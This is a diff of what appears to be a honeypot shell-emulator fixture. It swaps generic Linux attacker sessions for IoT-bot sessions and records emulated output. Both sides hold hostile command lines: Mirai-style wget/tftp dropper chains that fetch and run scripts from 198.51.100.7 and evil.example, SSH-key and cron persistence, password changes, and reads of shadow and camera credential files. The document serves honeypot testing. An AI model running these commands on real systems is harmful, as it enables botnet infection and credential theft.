@@ -1,330 +1,58 @@
-// Typical attacker sessions. Each case starts a fresh session.
-@user root
-$ whoami
-root
-@user admin
-$ whoami
-admin
-@user admin
-$ id
-uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)
-@user root
-$ pwd
-/root
-@user admin
-$ pwd
-/home/admin
-@user root
-$ uname -a
-Linux ip-10-0-2-15 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 GNU/Linux
-@user root
-$ uname -m
-x86_64
-@user root
-$ echo hello world
-hello world
-@user root
-$ echo -n hi
-hi
-[no newline]
-@user root
-$ echo "a  b" 'c $HOME' $HOME
-a  b c $HOME /root
-@user root
-$ X=5; echo "x=$X" ${Y:-dflt}
-x=5 dflt
-@user root
-$ echo $((2 + 3 * 4))
-14
-@user root
-$ echo $(echo nested) `echo tick`
-nested tick
-@user root
-$ nosuchcmd
-nosuchcmd: command not found
+// What IoT bots send after logging in.
+$ enable
+sh: enable: not found
 [exit 127]
-@user root
-$ false || echo fallback
-fallback
-@user root
-$ true && echo yes; false && echo no
-yes
-[exit 1]
-@user root
-$ cat /etc/passwd | grep root | wc -l
+$ system
+sh: system: not found
+[exit 127]
+$ shell
+sh: shell: not found
+[exit 127]
+$ sh
+$ linuxshell
+sh: linuxshell: not found
+[exit 127]
+$ /bin/busybox MIRAI
+MIRAI: applet not found
+[exit 127]
+$ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.51.100.7/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 198.51.100.7 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; rm -rf bins.sh tftp1.sh
+Connecting to 198.51.100.7 (198.51.100.7:80)
+saving to 'bins.sh'
+bins.sh              100% |********************************|    10  0:00:00 ETA
+'bins.sh' saved
+BusyBox v1.31.1 (2021-03-12 11:24:03 CST) multi-call binary.
+
+Usage: tftp [OPTIONS] HOST [PORT]
+chmod: tftp1.sh: No such file or directory
+sh: can't open 'tftp1.sh': No such file or directory
+$ /bin/busybox cat /bin/echo | head -c 4 | tail -c 3; echo
+ELF
+$ cat /proc/cpuinfo | grep -c processor; uname -m
 1
-@user root
-$ cat /proc/cpuinfo | grep name | wc -l
-4
-@user root
-$ cat /proc/cpuinfo | grep 'model name' | head -1 | awk -F: '{print $2}'
- Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz
-@user root
-$ free -m | grep Mem | awk '{print $2}'
-3911
-@user root
-$ nproc
-4
-@user admin
-$ cat /etc/shadow
-cat: /etc/shadow: Permission denied
+armv7l
+$ echo -e '\x41\x4b\x34\x37'
+AK47
+$ for d in /tmp /var /dev /mnt; do touch $d/.w && echo $d writable && rm $d/.w; done
+/tmp writable
+/var writable
+/dev writable
+touch: /mnt/.w: Read-only file system
 [exit 1]
-@user root
-$ cat /etc/shadow | head -1
-root:$y$j9T$PqK2sNw9bLx3T1nYb.0vC/$7uQ8yZq3K1mWvR0xFh2nP9dJt6bE4cA5sL8gU1oI2kD:19997:0:99999:7:::
-@user admin
-$ ls /root
-ls: cannot open directory '/root': Permission denied
-[exit 2]
-@user admin
-$ cd /root
--bash: cd: /root: Permission denied
+$ ls -la /tmp
+total 8
+drwxrwxrwt  2 root root 4096 Nov 17 12:00 .
+drwxr-xr-x 16 root root 4096 Feb 10  2025 ..
+$ cat /mnt/mtd/Config/Account
+[admin]
+password=Cam!2021admin
+level=Administrator
+[viewer]
+password=viewer
+level=User
+$ echo 'ssh-rsa AAAA attacker' >> /root/.ssh/authorized_keys
+sh: can't create /root/.ssh/authorized_keys: nonexistent directory
 [exit 1]
-@user root
-$ cd /tmp && pwd
-/tmp
-@user root
-$ cd /nope
--bash: cd: /nope: No such file or directory
-[exit 1]
-@user root
-$ ls /
-bin   dev  home  lib64  mnt  proc  run   snap  sys  usr
-boot  etc  lib   media  opt  root  sbin  srv   tmp  var
-@user root
-$ ls -la /root
-total 24
-drwx------  3 root root 4096 Jul  5 07:42 .
-drwxr-xr-x 18 root root 4096 Jul  5 07:42 ..
--rw-------  1 root root  121 Jul  5 07:42 .bash_history
--rw-r--r--  1 root root  572 Jul  5 07:42 .bashrc
--rw-r--r--  1 root root  161 Jul  5 07:42 .profile
-drwx------  2 root root 4096 Jul  5 07:42 .ssh
-@user total
-$ .bashrc
-.bashrc: command not found
-[exit 127]
-@user root
-$ ls -l /bin
-lrwxrwxrwx 1 root root 7 Jul  5 07:42 /bin -> usr/bin
-@user root
-$ ls -l /usr/bin/sudo
--rwsr-xr-x 1 root root 253020 Jul 20 12:00 /usr/bin/sudo
-@user root
-$ echo test > /tmp/f; cat /tmp/f; echo more >> /tmp/f; cat /tmp/f
-test
-test
-more
-@user root
-$ mkdir -p /tmp/a/b && touch /tmp/a/b/c && ls -R /tmp/a
-/tmp/a:
-b
-
-/tmp/a/b:
-c
-@user root
-$ rm -rf /
-rm: it is dangerous to operate recursively on '/'
-rm: use --no-preserve-root to override this failsafe
-[exit 1]
-@user root
-$ rm /nope
-rm: cannot remove '/nope': No such file or directory
-[exit 1]
-@user root
-$ rm -f /nope
-@user root
-$ ls /etc/*.conf
-/etc/resolv.conf
-@user root
-$ cd /etc && echo host*
-hostname hosts
-@user root
-$ echo '*'
-*
-@user root
-$ nonexist 2>/dev/null; echo $?
-127
-@user root
-$ nonexist 2>&1 | wc -l
-1
-@user root
-$ (echo a; echo b) | sort -r
-b
-a
-@user root
-$ echo c b a | tr ' ' '\n' | sort | head -2
-a
-b
-@user root
-$ echo hello | sed 's/l/L/g'
-heLLo
-@user root
-$ echo aGVsbG8K | base64 -d
-hello
-@user root
-$ echo -n hello | md5sum
-5d41402abc4b2a76b9719d911017c592  -
-@user root
-$ seq 3
-1
-2
-3
-@user root
-$ printf '%s-%d\n' a 1 b 2
-a-1
-b-2
-@user root
-$ which ls
-/usr/bin/ls
-@user root
-$ type cd
-cd is a shell builtin
-@user root
-$ crontab -l
-no crontab for root
-[exit 1]
-@user root
-$ (crontab -l 2>/dev/null; echo '* * * * * /tmp/x') | crontab - && crontab -l
-* * * * * /tmp/x
-@user admin
-$ echo 'admin:pw' | chpasswd
-chpasswd: (user admin) pam_chauthtok() failed, error:
-Authentication token manipulation error
-chpasswd: (line 1, user admin) password not changed
-[exit 1]
-@user root
-$ echo 'root:newpw' | chpasswd
-@user root
-$ cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAA x' >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cat ~/.ssh/authorized_keys
-ssh-rsa AAAA x
-@user root
-$ chmod 755 /tmp && ls -ld /tmp
-drwxr-xr-x 2 root root 4096 Jul  5 07:42 /tmp
-@user root
-$ wget -q http://198.51.100.7/x.sh -O /tmp/x.sh && sh /tmp/x.sh; echo rc=$?
-rc=0
-@user root
-$ curl -s ifconfig.me
-18.197.42.103
-@user root
-$ cd /tmp; wget http://evil.example/bot; chmod +x bot; ./bot
---2026-11-17 12:00:00--  http://evil.example/bot
-Resolving evil.example (evil.example)... 198.185.88.36
-Connecting to evil.example (evil.example)|198.185.88.36|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 27416 (27K) [application/octet-stream]
-Saving to: ‘bot’
-
-bot                  100%[===================>]     27K  81K/s    in 0.4s   
-
-2026-11-17 12:00:01 (81K/s) - ‘bot’ saved [27416/27416]
-
-Segmentation fault (core dumped)
-[exit 139]
-@user root
-$ /usr/bin/whoami
-root
-@user root
-$ rm /usr/bin/ls; ls
-ls: command not found
-[exit 127]
-@user root
-$ export FOO=bar; env | grep FOO
-FOO=bar
-@user root
-$ echo 'echo from script $1' > /tmp/s.sh; chmod +x /tmp/s.sh; /tmp/s.sh arg
-from script arg
-@user root
-$ bash -c 'echo inline; whoami'
-inline
-root
-@user root
-$ echo 'echo piped' | sh
-piped
-@user root
-$ if true; then
-if: command not found
-then: command not found
-[exit 127]
-@user root
-$ echo 'unterminated
--bash: syntax error near unexpected token `newline'
-[exit 2]
-@user root
-$ | foo
--bash: syntax error near unexpected token `|'
-[exit 2]
-@user root
-$ ls -d /tmp /etc
-/etc  /tmp
-@user root
-$ test -d /etc && echo dir; [ -f /etc/passwd ] && echo file; [ 3 -gt 5 ] || echo small
-dir
-file
-small
-@user root
-$ echo ${#HOME}
-5
-@user root
-$ cat /etc/os-release | grep PRETTY
-PRETTY_NAME="Ubuntu 24.04.1 LTS"
-@user root
-$ hostname
-ip-10-0-2-15
-@user root
-$ ls -lh $(which ls)
--rwxr-xr-x 1 root root 141K Jul 20 12:00 /usr/bin/ls
-@user root
-$ find /etc -name 'host*'
-/etc/hostname
-/etc/hosts
-@user admin
-$ find /root
-/root
-find: '/root': Permission denied
-[exit 1]
-@user root
-$ cp /etc/hosts /tmp/h && mv /tmp/h /tmp/h2 && cat /tmp/h2 | head -1
-127.0.0.1 localhost
-@user root
-$ ln -s /etc/hostname /tmp/hn && cat /tmp/hn
-ip-10-0-2-15
-@user root
-$ ps aux | grep sshd | head -1
-root         702  0.0  0.2  12020  8064 ?        Ss   Oct03   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
-@user root
-$ echo a;; echo b
--bash: syntax error near unexpected token `;'
-[exit 2]
-@user root
-$ yes | head -3
-y
-y
-y
-@user root
-$ exit 3
-[exit 3]
-@user root
-$ uptime
- 12:00:00 up 45 days,  4:18,  1 user,  load average: 0.08, 0.03, 0.01
-@user root
-$ echo $SHELL $USER
-/bin/bash root
-@user root
-$ awk 'BEGIN{x=1}' /dev/null; echo ok
-ok
-@user root
-$ cat /etc/passwd | awk -F: '{print $1}' | head -2
-root
-daemon
-@user root
-$ echo a b c | xargs -n1 echo
-a b c
-@user root
-$ echo 'x' > /etc/hostname && cat /etc/hostname
-x
-@user admin
-$ echo x > /etc/hostname
--bash: /etc/hostname: Permission denied
-[exit 1]
+$ nohup ./x &
+[1] 25084
+sh: nohup: not found
+$ history
